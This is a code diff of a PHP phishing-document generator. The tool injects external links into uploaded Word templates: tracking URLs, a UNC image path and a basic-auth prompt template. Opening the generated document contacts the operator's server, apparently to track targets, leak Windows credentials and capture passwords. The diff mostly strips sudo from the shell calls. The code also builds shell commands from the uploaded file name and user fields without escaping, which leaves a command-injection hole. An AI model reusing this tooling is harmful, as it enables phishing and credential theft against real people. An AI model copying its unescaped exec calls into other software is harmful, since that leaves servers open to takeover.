@@ -275,8 +275,9 @@ $Org = preg_replace('/[^a-zA-Z0-9 ]/', '', $Org);
 
 
 // Generates Payload
-$cmdcleanup = "sudo rm -rf /var/www/uploads/*;";
-exec($cmdcleanup);
+$cmdcleanup = "rm -rf /var/www/uploads/*;";
+exec($cmdcleanup,$outputcleanup);
+//var_dump($outputcleanup);
 
 // File Upload Piece
 $target_dir = "../../uploads/";
@@ -313,34 +314,32 @@ if ($uploadOk == 0) {
 if($uploadOk == 1){
 
 // If the a Document Template was Uploaded, Insert Payload
-$cmd0 = "sudo cp '/var/www/uploads/".(basename( $_FILES["fileToUpload"]["name"]))."' /var/www/uploads/Phishing.docx;";
+$cmd0 = "cp '/var/www/uploads/".(basename( $_FILES["fileToUpload"]["name"]))."' /var/www/uploads/Phishing.docx;";
 //$cmd0 = escapeshellcmd($cmd0);
 exec($cmd0,$output0);
-
 //var_dump($output0);
-//echo $cmd0;
 
-$cmd1 = "sudo python InjectPayload.py \"".(basename( $_FILES["fileToUpload"]["name"]))."\";";
+$cmd1 = "python InjectPayload.py \"".(basename( $_FILES["fileToUpload"]["name"]))."\";";
 //$cmd1 = escapeshellcmd($cmd1);
 exec ($cmd1,$output1);
-
 //var_dump($output1);
-//echo $cmd1;
 
-$cmd2 = "cd /var/www/uploads/ && sudo unzip -o Phishing.docx;";
+$cmd2 = "cd /var/www/uploads/ && unzip -o Phishing.docx;";
 //$cmd2 = escapeshellcmd($cmd2);
 exec ($cmd2,$output2);
+//var_dump($output2);
 
 if(isset($_REQUEST['basicauth'])){
 
 $cmdchecksettings = "ls /var/www/uploads/word/_rels/ | grep 'settings.xml.rels'";
 exec($cmdchecksettings,$outputchecksettings);
+//var_dump($outputchecksettings);
 
 if(isset($outputchecksettings[0])){
 
 // If settings.xml.rels already exists, append template instead of replacing the file
-$cmdsettingsxmlrelsperms = "sudo chmod 777 /var/www/uploads/word/_rels/settings.xml.rels; sudo chmod 777 /var/www/uploads/word/settings.xml;";
-exec($cmdsettingsxmlrelsperms);
+//$cmdsettingsxmlrelsperms = "sudo chmod 777 /var/www/uploads/word/_rels/settings.xml.rels; sudo chmod 777 /var/www/uploads/word/settings.xml;";
+//exec($cmdsettingsxmlrelsperms);
 
 $settingsxmlrels = file_get_contents("/var/www/uploads/word/_rels/settings.xml.rels");
 
@@ -359,21 +358,25 @@ fwrite($handlerels, $datarels);
 
 } else {
 
-$cmdbasicauthtemplate = "sudo cp settings.xml.rels.TEMPLATE /var/www/uploads/word/_rels/settings.xml.rels; sudo chmod 777 /var/www/uploads/word/settings.xml";
-exec ($cmdbasicauthtemplate);
+$cmdbasicauthtemplate = "cp settings.xml.rels.TEMPLATE /var/www/uploads/word/_rels/settings.xml.rels;";
+exec ($cmdbasicauthtemplate,$outputbasicauthtemplate);
+echo $outputbasicauthtemplate;
 
 }
 
 $basicauthurl = "?target=".stripslashes($Target)."\&amp;org=".stripslashes($Org)."\&amp;id=".stripslashes($uniqueid)."\&amp;auth=1";
 
-$cmd15 = "sudo sed -i -e 's~REPLACEME~".$basicauthurl."~g' /var/www/uploads/word/_rels/settings.xml.rels;";
-exec($cmd15);
+$cmd15 = "sed -i -e 's~REPLACEME~".$basicauthurl."~g' /var/www/uploads/word/_rels/settings.xml.rels;";
+exec($cmd15,$output15);
+//var_dump($output15);
 
-$cmd17 = "sudo sed -i -e 's~HTTPVALUE~".stripslashes($HTTPValue)."~g' /var/www/uploads/word/_rels/settings.xml.rels;";
-exec($cmd17);
+$cmd17 = "sed -i -e 's~HTTPVALUE~".stripslashes($HTTPValue)."~g' /var/www/uploads/word/_rels/settings.xml.rels;";
+exec($cmd17,$output17);
+//var_dump($output17);
 
-$cmd18 = "sudo sed -i -e 's~URLVALUE~".stripslashes($URL)."~g' /var/www/uploads/word/_rels/settings.xml.rels;";
-exec($cmd18);
+$cmd18 = "sed -i -e 's~URLVALUE~".stripslashes($URL)."~g' /var/www/uploads/word/_rels/settings.xml.rels;";
+exec($cmd18,$output18);
+//var_dump($output18);
 
 $settingsxml = file_get_contents("/var/www/uploads/word/settings.xml");
 
@@ -393,90 +396,96 @@ fwrite($handle, $data);
 $cmd3 = "ls /var/www/uploads/word/media -1 | sort -V | tail -2 |grep 'png'";
 //$cmd3 = escapeshellcmd($cmd3);
 exec ($cmd3,$outputcmd2);
-
-//echo $cmd3;
 //var_dump($outputcmd2);
 
-$cmd4 = 'sudo sed -i -e \'s~media/'.stripslashes($outputcmd2[0]).'\\"~'.stripslashes($HTTPValue).'://'.stripslashes($URL).'/phishingdocs?target='.stripslashes($Target).'\&amp;org='.stripslashes($Org).'\&amp;id='.stripslashes($uniqueid).'\\" TargetMode=\\"External\\"~g\' /var/www/uploads/word/_rels/document.xml.rels;';
+$cmd4 = 'sed -i -e \'s~media/'.stripslashes($outputcmd2[0]).'\\"~'.stripslashes($HTTPValue).'://'.stripslashes($URL).'/phishingdocs?target='.stripslashes($Target).'\&amp;org='.stripslashes($Org).'\&amp;id='.stripslashes($uniqueid).'\\" TargetMode=\\"External\\"~g\' /var/www/uploads/word/_rels/document.xml.rels;';
 //$cmd4 = escapeshellcmd($cmd4);
 exec($cmd4,$output4);
-
 //var_dump($output4);
 
-$cmd5 = 'sudo sed -i -e \'s~media/'.stripslashes($outputcmd2[1]).'\\"~\\\\\\\\'.stripslashes($URL).'/phishingdocs.jpg\\" TargetMode=\\"External\\"~g\' /var/www/uploads/word/_rels/document.xml.rels;';
+$cmd5 = 'sed -i -e \'s~media/'.stripslashes($outputcmd2[1]).'\\"~\\\\\\\\'.stripslashes($URL).'/phishingdocs.jpg\\" TargetMode=\\"External\\"~g\' /var/www/uploads/word/_rels/document.xml.rels;';
 //$cmd5 = escapeshellcmd($cmd5);
 exec($cmd5,$output5);
-
 //var_dump($output5);
-$cmd6 = "cd /var/www/uploads/ && sudo zip -r Phishing.docx word/;";
+
+$cmd6 = "cd /var/www/uploads/ && zip -r Phishing.docx word/;";
 //$cmd6 = escapeshellcmd($cmd6);
 exec($cmd6, $output6);
-
 //var_dump($output6);
-//echo $cmd6;
 
 $cmd7 = "cp /var/www/uploads/Phishing.docx /var/www/html/phishingdocs/hosted/".$uniqid.".docx;";
 //$cmd7 = escapeshellcmd($cmd7);
 exec($cmd7, $output7);
-
 //var_dump($output7);
-//echo $cmd7;
 
 } else {
 
 // If a Template was NOT Uploaded, Create a Default Template for Them
 $cmd8 = "cp document.xml.rels.TEMPLATE word/_rels/document.xml.rels;";
 //$cmd8 = escapeshellcmd($cmd8);
-exec($cmd8);
+exec($cmd8,$output8);
+//var_dump($output8);
 
 $cmd14 = "cp settings.xml.rels.TEMPLATE word/_rels/settings.xml.rels;";
-exec($cmd14);
+exec($cmd14,$output14);
+//var_dump($output14);
 
 if(isset($_REQUEST['basicauth'])){
 
 $basicauthurl = "?target=".stripslashes($Target)."\&amp;org=".stripslashes($Org)."\&amp;id=".stripslashes($uniqueid)."\&amp;auth=1";
 
-$cmd15 = "sudo sed -i -e 's~REPLACEME~".$basicauthurl."~g' word/_rels/settings.xml.rels;";
-exec($cmd15);
+$cmd15 = "sed -i -e 's~REPLACEME~".$basicauthurl."~g' word/_rels/settings.xml.rels;";
+exec($cmd15,$output15);
+//var_dump($output15);
 
-$cmd17 = "sudo sed -i -e 's~HTTPVALUE~".stripslashes($HTTPValue)."~g' word/_rels/settings.xml.rels;";
-exec($cmd17);
+$cmd17 = "sed -i -e 's~HTTPVALUE~".stripslashes($HTTPValue)."~g' word/_rels/settings.xml.rels;";
+exec($cmd17,$output17);
+//var_dump($output17);
 
-$cmd18 = "sudo sed -i -e 's~URLVALUE~".stripslashes($URL)."~g' word/_rels/settings.xml.rels;";
-exec($cmd18);
+$cmd18 = "sed -i -e 's~URLVALUE~".stripslashes($URL)."~g' word/_rels/settings.xml.rels;";
+exec($cmd18,$output18);
+//var_dump($output18);
 
 }
 
-$cmd9 = "sudo sed -i -e 's~HTTPVALUE~".stripslashes($HTTPValue)."~g' word/_rels/document.xml.rels;";
+$cmd9 = "sed -i -e 's~HTTPVALUE~".stripslashes($HTTPValue)."~g' word/_rels/document.xml.rels;";
 //$cmd9 = escapeshellcmd($cmd9);
-exec($cmd9);
+exec($cmd9,$output9);
+//var_dump($output9);
 
-$cmd10 = "sudo sed -i -e 's~URLVALUE~".stripslashes($URL)."~g' word/_rels/document.xml.rels;";
+$cmd10 = "sed -i -e 's~URLVALUE~".stripslashes($URL)."~g' word/_rels/document.xml.rels;";
 //$cmd10 = escapeshellcmd($cmd10);
-exec($cmd10);
+exec($cmd10,$output10);
+//var_dump($output10);
 
-$cmd11 = "sudo sed -i -e 's~TARGETVALUE~".stripslashes($Target)."~g' word/_rels/document.xml.rels;";
+$cmd11 = "sed -i -e 's~TARGETVALUE~".stripslashes($Target)."~g' word/_rels/document.xml.rels;";
 //$cmd11 = escapeshellcmd($cmd11);
-exec($cmd11);
+exec($cmd11,$output11);
+//var_dump($output11);
 
-$cmd12 = "sudo sed -i -e 's~ORGVALUE~".stripslashes($Org)."~g' word/_rels/document.xml.rels;";
+$cmd12 = "sed -i -e 's~ORGVALUE~".stripslashes($Org)."~g' word/_rels/document.xml.rels;";
 //$cmd12 = escapeshellcmd($cmd12);
-exec($cmd12);
+exec($cmd12,$output12);
+//var_dump($output12);
 
-$cmdID = "sudo sed -i -e 's~IDVALUE~".$uniqueid."~g' word/_rels/document.xml.rels;";
+$cmdID = "sed -i -e 's~IDVALUE~".$uniqueid."~g' word/_rels/document.xml.rels;";
 //$cmdID = escapeshellcmd($cmdID);
-exec($cmdID);
+exec($cmdID,$outputID);
+//var_dump($outputID);
 
-$cmd13 = "sudo sudo zip -r Phishing.docx word/_rels/document.xml.rels";
+$cmd13 = "zip -r Phishing.docx word/_rels/document.xml.rels";
 //$cmd13 = escapeshellcmd($cmd13);
-exec($cmd13);
+exec($cmd13,$output13);
+//var_dump($output13);
 
-$cmd16 = "sudo sudo zip -r Phishing.docx word/_rels/settings.xml.rels";
+$cmd16 = "zip -r Phishing.docx word/_rels/settings.xml.rels";
 //$cmd13 = escapeshellcmd($cmd13);
-exec($cmd16);
+exec($cmd16,$output16);
+//var_dump($output16);
 
-$cmd17 = "sudo cp Phishing.docx hosted/".$uniqid.".docx";
-exec($cmd17);    
+$cmd17 = "cp Phishing.docx hosted/".$uniqid.".docx";
+exec($cmd17,$output17);    
+//var_dump($output17);
     
 }
 
